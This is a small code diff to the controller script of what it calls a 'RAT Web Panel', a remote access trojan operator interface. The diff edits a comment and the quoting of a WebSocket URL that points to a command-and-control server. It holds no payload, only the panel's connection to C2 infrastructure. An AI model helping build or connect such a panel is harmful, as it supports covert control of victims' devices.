@@ -1,9 +1,9 @@
 /**
  * RAT Web Panel — Controller
- * Connects to C2 server via WebSocket (/ws/controller path)
+ * Connects to C2 server via WebSocket (/controller path)
  */
 
-const WS_URL = `wss://serv-545b.onrender.com/ws/controller`;
+const WS_URL = "wss://serv-545b.onrender.com/ws/controller";
 
 let ws              = null;
 let selectedDevice  = null;
